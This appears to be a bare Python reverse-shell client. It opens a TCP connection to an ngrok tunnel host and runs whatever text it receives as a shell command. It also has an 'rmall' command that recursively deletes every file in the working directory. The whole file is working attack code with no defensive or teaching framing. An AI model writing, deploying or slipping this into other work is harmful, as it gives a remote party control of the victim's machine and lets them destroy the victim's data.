from socket import *
import random, subprocess, os
from os import chdir, getcwd, listdir
from os.path import isfile
cli = socket(AF_INET, SOCK_STREAM)
host = '0.tcp.sa.ngrok.io'
port = 19018

cli.connect((host, port))
while 1:
    data = cli.recv(1024)
    if data:
        if data.decode() == 'cd..':
            os.chdir('..')
            proc = subprocess.Popen('cd ..', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            cli.send(output)
        elif data.decode() == 'rmall':
            for c in listdir():
                proc = subprocess.Popen(f'rm -rf {c}', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
            cli.send(output)
        else:
            proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()


            # cli.send(output)
